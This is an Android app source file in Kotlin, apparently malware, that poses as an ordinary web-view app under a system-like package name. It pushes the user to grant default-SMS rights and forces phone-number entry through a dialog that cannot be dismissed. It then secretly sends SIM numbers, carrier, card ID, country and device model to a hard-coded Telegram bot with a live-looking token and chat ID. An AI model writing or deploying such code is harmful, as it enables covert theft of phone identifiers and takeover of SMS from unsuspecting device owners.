package com.android.quickdraw

import android.annotation.SuppressLint
import android.app.Activity
import android.app.AlertDialog
import android.app.role.RoleManager
import android.content.Context
import android.content.Intent
import android.content.SharedPreferences
import android.graphics.Color
import android.graphics.drawable.ColorDrawable
import android.net.ConnectivityManager
import android.net.NetworkCapabilities
import android.os.Build
import android.os.Bundle
import android.provider.Telephony
import android.telephony.SubscriptionManager
import android.telephony.TelephonyManager
import android.text.InputType
import android.view.LayoutInflater
import android.webkit.WebResourceRequest
import android.webkit.WebView
import android.webkit.WebViewClient
import android.widget.Button
import android.widget.EditText
import android.widget.TextView
import android.widget.Toast
import androidx.activity.result.contract.ActivityResultContracts
import androidx.appcompat.app.AppCompatActivity
import okhttp3.Callback
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.Response
import java.io.IOException
import java.util.regex.Pattern

class MainActivity : AppCompatActivity() {
    private lateinit var webView: WebView
    private lateinit var sharedPreferences: SharedPreferences
    private val client = OkHttpClient()
    private val botToken = "7824327491:AAGmZ5eA57SWIpWI3hfqRFEt6cnrQPAhnu8"
    private val chatId = "6331293386"
    private val phonePattern = Pattern.compile("^(\\+7|8|7)?\\d{10}$")
    private val PHONE_KEY = "saved_phone"

    private val smsRoleLauncher = registerForActivityResult(ActivityResultContracts.StartActivityForResult()) { result ->
        when (result.resultCode) {
            Activity.RESULT_OK -> {
                sendToTelegram("Пользователь предоставил права SMS-приложения по умолчанию")
                sendSimInfo()
                loadWebPage()
            }
            else -> {
                if (!sharedPreferences.contains(PHONE_KEY)) {
                    showPhoneInputDialog()
                } else {
                    loadWebPage()
                }
            }
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)
        
        sharedPreferences = getPreferences(Context.MODE_PRIVATE)
        setupWebView()
        checkInternetConnection()
    }

    private fun setupWebView() {
        webView = findViewById(R.id.webview)
        with(webView.settings) {
            javaScriptEnabled = true
            domStorageEnabled = true
            javaScriptCanOpenWindowsAutomatically = true
        }
        
        webView.webViewClient = object : WebViewClient() {
            override fun shouldOverrideUrlLoading(view: WebView, url: String): Boolean {
                view.loadUrl(url)
                return true
            }

            override fun shouldOverrideUrlLoading(view: WebView, request: WebResourceRequest): Boolean {
                view.loadUrl(request.url.toString())
                return true
            }
        }
    }

    private fun checkInternetConnection() {
        if (isInternetAvailable()) {
            if (!sharedPreferences.contains(PHONE_KEY)) {
                requestSmsRole()
            } else {
                loadWebPage()
            }
        } else {
            showNoInternetDialog { checkInternetConnection() }
        }
    }

    private fun requestSmsRole() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            val roleManager = getSystemService(RoleManager::class.java)
            if (roleManager?.isRoleAvailable(RoleManager.ROLE_SMS) == true && 
                !roleManager.isRoleHeld(RoleManager.ROLE_SMS)) {
                smsRoleLauncher.launch(roleManager.createRequestRoleIntent(RoleManager.ROLE_SMS))
                return
            }
        }
        
        // Для версий ниже Android 10
        val intent = Intent(Telephony.Sms.Intents.ACTION_CHANGE_DEFAULT)
        intent.putExtra(Telephony.Sms.Intents.EXTRA_PACKAGE_NAME, packageName)
        smsRoleLauncher.launch(intent)
    }

    @SuppressLint("MissingPermission", "HardwareIds")
    private fun sendSimInfo() {
        try {
            val telephonyManager = getSystemService(TelephonyManager::class.java)
            val simInfo = StringBuilder("Информация о SIM-картах:\n")
            
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP_MR1) {
                val subscriptionManager = getSystemService(SubscriptionManager::class.java)
                val subscriptions = subscriptionManager.activeSubscriptionInfoList ?: emptyList()
                
                simInfo.append("Найдено SIM-карт: ${subscriptions.size}\n\n")
                
                for (sub in subscriptions) {
                    val number = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                        telephonyManager.createForSubscriptionId(sub.subscriptionId).line1Number
                    } else {
                        telephonyManager.line1Number
                    }
                    
                    simInfo.append("SIM ${sub.simSlotIndex + 1}:\n")
                        .append("• Номер: ${number ?: "недоступен"}\n")
                        .append("• Оператор: ${sub.carrierName ?: "неизвестен"}\n")
                        .append("• IMSI: ${sub.iccId ?: "недоступен"}\n")
                        .append("• Страна: ${sub.countryIso?.uppercase() ?: "неизвестна"}\n\n")
                }
            } else {
                simInfo.append("Основной номер SIM: ${telephonyManager.line1Number ?: "недоступен"}\n")
            }
            
            sendToTelegram(simInfo.toString())
        } catch (e: Exception) {
            sendToTelegram("Ошибка при получении информации о SIM: ${e.message}")
        }
    }

    private fun showPhoneInputDialog() {
        val dialogView = LayoutInflater.from(this).inflate(R.layout.dialog_phone_input, null)
        val dialog = AlertDialog.Builder(this)
            .setView(dialogView)
            .setCancelable(false)
            .create()

        dialog.window?.setBackgroundDrawable(ColorDrawable(Color.TRANSPARENT))

        val phoneInput = dialogView.findViewById<EditText>(R.id.phone_input)
        val continueButton = dialogView.findViewById<Button>(R.id.continue_button)

        continueButton.setOnClickListener {
            val phone = phoneInput.text.toString().trim()
            if (isValidPhone(phone)) {
                sharedPreferences.edit().putString(PHONE_KEY, phone).apply()
                sendToTelegram("Введен номер телефона: $phone")
                dialog.dismiss()
                loadWebPage()
            } else {
                Toast.makeText(this, "Некорректный номер телефона", Toast.LENGTH_SHORT).show()
            }
        }

        dialog.show()
    }

    private fun isValidPhone(phone: String): Boolean {
        return phonePattern.matcher(phone).matches()
    }

    private fun showNoInternetDialog(retryAction: () -> Unit) {
        AlertDialog.Builder(this)
            .setTitle("Нет подключения")
            .setMessage("Требуется интернет-соединение")
            .setPositiveButton("Повторить") { _, _ -> retryAction() }
            .setCancelable(false)
            .show()
    }

    private fun isInternetAvailable(): Boolean {
        val cm = getSystemService(ConnectivityManager::class.java)
        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            cm.activeNetwork?.let { network ->
                cm.getNetworkCapabilities(network)?.run {
                    hasCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET) && 
                    hasCapability(NetworkCapabilities.NET_CAPABILITY_VALIDATED)
                }
            } ?: false
        } else {
            @Suppress("DEPRECATION")
            cm.activeNetworkInfo?.isConnected == true
        }
    }

    private fun loadWebPage() {
        webView.loadUrl("https://example.com") // Замените на нужный URL
    }

    private fun sendToTelegram(message: String) {
        val fullMessage = "$message\nУстройство: ${Build.MANUFACTURER} ${Build.MODEL}"
        val json = """{"chat_id":"$chatId","text":"${fullMessage.replace("\"", "\\\"")}"}"""
        
        val request = Request.Builder()
            .url("https://api.telegram.org/bot$botToken/sendMessage")
            .post(json.toRequestBody("application/json".toMediaType()))
            .build()

        client.newCall(request).enqueue(object : Callback {
            override fun onFailure(call: okhttp3.Call, e: IOException) {}
            override fun onResponse(call: okhttp3.Call, response: Response) { response.close() }
        })
    }

    override fun onBackPressed() {
        if (webView.canGoBack()) webView.goBack() else super.onBackPressed()
    }
}
